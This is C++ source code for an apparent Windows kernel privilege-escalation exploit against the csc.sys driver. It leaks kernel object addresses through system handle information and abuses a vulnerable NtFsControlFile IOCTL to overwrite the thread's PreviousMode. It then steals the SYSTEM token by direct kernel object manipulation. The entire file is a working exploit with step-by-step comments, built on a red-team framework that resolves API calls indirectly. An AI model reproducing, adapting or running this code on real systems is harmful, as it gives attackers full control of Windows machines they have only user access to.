#include <firebeam.h>
#include <common.h>
#include <sal.h>

/*!
 * @brief
 *  leak kernel object by its handle
 *
 * @param Handle
 *  handle to the kernel object to leak
 *
 * @param Pid
 *  target process id
 *
 * @param Object
 *  leaked object pointer address
 *
 * @return
 *  status of function
 */
NTSTATUS ObjectPointer(
    _In_  U_PTR  Handle,
    _In_  U_PTR  Pid,
    _Out_ U_PTR* Object
) {
    NTSTATUS                   Status     = { 0 };
    PSYSTEM_HANDLE_INFORMATION HandleInfo = { 0 };
    ULONG                      Length     = ULONG { 0 };

    if ( ! Handle || ! Pid || ! Object ) {
        return 0xC0000001;
    }

    //
    // expected error 0xC0000004 (STATUS_INFO_LENGTH_MISMATCH) til we
    // have the correct size to allocate enough memory and til the
    // NtQuerySystemInformation calls successfully
    //

    while ( ( Status = Kaine::win32::call<NTSTATUS>(
        C_STR( "NtQuerySystemInformation" ),
        SystemHandleInformation, HandleInfo, Length, &Length
    ) ) == 0xC0000004L ) {
        if ( HandleInfo ) {
            if ( ! ( HandleInfo = Kaine::mem::realloc<PSYSTEM_HANDLE_INFORMATION>( HandleInfo, Length * 2 ) ) ) {
                goto END;
            }
        } else {
            if ( ! ( HandleInfo = Kaine::mem::alloc<PSYSTEM_HANDLE_INFORMATION>( Length * 2 ) ) ) {
                goto END;
            }
        }
    }

    //
    // iterate over the handle info list and search for
    // the handle and its kernel object pointer address
    //

    for ( int i = 0; i < HandleInfo->NumberOfHandles; i++ ) {
        //
        // indentify if it is our target handle
        // associated with the associated process id
        //
        if ( ( HandleInfo->Handles[ i ].UniqueProcessId == Pid    ) &&
             ( HandleInfo->Handles[ i ].HandleValue     == Handle )
        ) {
            *Object = U_PTR( HandleInfo->Handles[ i ].Object );
            Status  = 0;
            break;
        }
    }

END:
    if ( HandleInfo ) {
        Kaine::mem::free( HandleInfo );
    } else {
        Status = 0xC000009A; // STATUS_INSUFFICIENT_RESOURCES
        Kaine::io::print( C_STR( "failed to allocate HandleInfo memory\n" ) );
    }

    return Status;
}

int main() {
    UNICODE_STRING    ObjectName    = { 0 };
    OBJECT_ATTRIBUTES ObjectAttr    = { 0 };
    IO_STATUS_BLOCK   IoStatusBlock = { 0 };
    NTSTATUS          Status        = { 0 };
    HANDLE            FileHandle    = { 0 };
    HANDLE            ThreadHandle  = { 0 };
    HANDLE            ProcessHandle = { 0 };
    U_PTR             SystemObj     = { 0 };
    U_PTR             ThreadObj     = { 0 };
    U_PTR             ProcessObj    = { 0 };
    U_PTR             ThreadId      = { 0 };
    U_PTR             ProcessId     = { 0 };
    U_PTR             PreviousMode  = { 0 };
    U_PTR             NtWrite       = { 0 };
    U_PTR             Written       = { 0 };
    U_PTR             Ntdll         = { 0 };

    ThreadId  = Kaine::win32::call<U_PTR>( C_STR( "GetCurrentThreadId" ) );
    ProcessId = Kaine::win32::call<U_PTR>( C_STR( "GetCurrentProcessId" ) );
    Ntdll     = Kaine::win32::call<U_PTR>( C_STR( "GetModuleHandleA" ), "ntdll" );
    NtWrite   = Kaine::win32::call<U_PTR>( C_STR( "GetProcAddress" ), Ntdll, C_STR( "NtWriteVirtualMemory" ) );

    //
    // start the exploit
    //  1. open handle to csc.sys driver
    //  2. leak the kernel address of _EPROCESS from the system process
    //  3. opening current thread handle and leak address of _KTHREAD kernel object
    //  4. opening current process handle and leak address of _EPROCESS kernel object
    //  5. overwrite _KTHREAD->PreviousMode to KernelMode using NtFsControlFile and the vulnerable IOCTL
    //  6. leveraging DKOM to achieve LPE by copying over the token from the system process over to the current process token
    //  7. revert the _KTHREAD->PreviousMode back to UserMode
    //  8. exploit completed
    //

    Kaine::win32::call<void>( C_STR( "RtlInitUnicodeString" ), &ObjectName, L"\\Device\\Mup\\;Csc\\.\\." );
    InitializeObjectAttributes( &ObjectAttr, &ObjectName, 0, 0, 0 );

    //
    // open handle to the csc system driver
    //
    if ( ! NT_SUCCESS( Status = Kaine::win32::call<NTSTATUS>(
        C_STR( "NtCreateFile" ),
        &FileHandle, SYNCHRONIZE, &ObjectAttr, &IoStatusBlock, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, 0, 0
    ) ) || ! FileHandle ) {
        Kaine::io::print( C_STR( "[-] NtCreateFile failed: %p\n" ), Status );
        goto END;
    }

    Kaine::io::print( C_STR( "[*] kernel driver handle (%ls): %p\n" ), ObjectName.Buffer, FileHandle );

    //
    // leak the _EPROCESS kernel object address of the system process
    //
    if ( ! NT_SUCCESS( Status = ObjectPointer( 4, 4, &SystemObj ) ) ) {
        Kaine::io::print( C_STR( "[-] failed to leak system _EPROCESS kernel address: %p\n" ), Status );
        goto END;
    };

    Kaine::io::print( C_STR( "[*] system _EPROCESS kernel address: %p\n" ), SystemObj );

    //
    // open the handle to the current thread to leak the _KTHREAD kernel address
    //
    if ( ! ( ThreadHandle = Kaine::win32::call<HANDLE>( C_STR( "OpenThread" ), THREAD_QUERY_INFORMATION, true, ThreadId ) ) ) {
        Kaine::io::print( C_STR( "[-] OpenThread failed: %lx\n" ), Kaine::win32::call<ULONG>( C_STR( "GetLastError" ) ) );
        goto END;
    }

    //
    // leak the _KTHREAD kernel object address of our current thread
    //
    if ( ! NT_SUCCESS( Status = ObjectPointer( U_PTR( ThreadHandle ), ProcessId, &ThreadObj ) ) ) {
        Kaine::io::print( C_STR( "[-] failed to leak system _EPROCESS kernel address: %p\n" ), Status );
        goto END;
    };

    Kaine::io::print( C_STR( "[*] current thread (%x) _KTHREAD kernel address: %p\n" ), ThreadHandle, ThreadObj );

    //
    // open the handle to the current thread to leak the _KTHREAD kernel address
    //
    if ( ! ( ProcessHandle = Kaine::win32::call<HANDLE>( C_STR( "OpenProcess" ), PROCESS_QUERY_INFORMATION, true, ProcessId ) ) ) {
        Kaine::io::print( C_STR( "[-] OpenProcess failed: %lx\n" ), Kaine::win32::call<ULONG>( C_STR( "GetLastError" ) ) );
        goto END;
    }

    //
    // leak the _KTHREAD kernel object address of our current thread
    //
    if ( ! NT_SUCCESS( Status = ObjectPointer( U_PTR( ProcessHandle ), ProcessId, &ProcessObj ) ) ) {
        Kaine::io::print( C_STR( "[-] failed to leak system _EPROCESS kernel address: %p\n" ), Status );
        goto END;
    };

    Kaine::io::print( C_STR( "[*] current process (%x) _EPROCESS kernel address: %p\n" ), ProcessHandle, ProcessObj );

    //
    // corrupt the KTHREAD->PreviousMode of the
    // current thread to have access to kernel memory
    //
    Status = Kaine::win32::call<NTSTATUS>(
        C_STR( "NtFsControlFile" ),
        FileHandle, 0, 0, 0, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE, C_PTR( ThreadObj + KTHREAD_PREVIOUS_MODE_OFFSET - 0x18 ), 0, 0, 0
    );

    //
    // leveraging DKOM to achieve LPE by copying over the token
    // from the system process over to the current process token
    //
    if ( ! NT_SUCCESS( Status = Kaine::win32::call<NTSTATUS>(
        NtWrite,
        NtCurrentProcess(), ProcessObj + EPROCESS_TOKEN_OFFSET, SystemObj + EPROCESS_TOKEN_OFFSET, 0x8, U_PTR( &Written )
    ) ) ) {
        Kaine::io::print( C_STR( "[-] NtWriteVirtualMemory failed: %p\n" ), Status );
        goto END;
    }

    //
    // restore KTHREAD->PreviousMode to UserMode
    //
    PreviousMode = UserMode;
    if ( ! NT_SUCCESS( Status = Kaine::win32::call<NTSTATUS>(
        NtWrite,
        NtCurrentProcess(), ThreadObj + KTHREAD_PREVIOUS_MODE_OFFSET, U_PTR( &PreviousMode ), 0x1, U_PTR( &Written )
    ) ) ) {
        Kaine::io::print( C_STR( "[-] NtWriteVirtualMemory failed: %p\n" ), Status );
        goto END;
    }

    Kaine::io::print( C_STR( "[+] exploit finished\n" ) );

END:
    if ( FileHandle ) {
        Kaine::win32::call<NTSTATUS>( C_STR( "NtClose" ), FileHandle );
    }

    if ( ThreadHandle ) {
        Kaine::win32::call<NTSTATUS>( C_STR( "NtClose" ), ThreadHandle );
    }

    if ( ProcessHandle ) {
        Kaine::win32::call<NTSTATUS>( C_STR( "NtClose" ), ProcessHandle );
    }

    Kaine::io::flush();

    return Status;
}
